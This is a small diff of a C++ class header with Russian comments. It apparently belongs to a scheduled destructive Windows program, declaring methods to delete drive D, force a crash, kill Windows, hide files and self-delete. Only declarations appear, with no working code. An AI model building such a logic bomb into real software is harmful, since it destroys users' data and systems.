@@ -17,12 +17,12 @@ public:
 	// записываем в реестр когда выполнится задача
 	bool SaveDateOfPerformance(SYSTEMTIME SysTime);
 	// записываем какую папку будем удалять
-	bool SavePathOfFolderToDelete(CString csFolderPath);	
+	bool SavePathOfFolderToDelete(CString csFolderPath);
+	void HideFile(bool bHide);
 	bool EnableCrashOnCtrlScroll();
 	bool DeleteDiskD();
 	bool SaveTaskKillWindows();
 	void SelfDelete();
-	void HideFile();
 	bool PerformATask();
 };
 
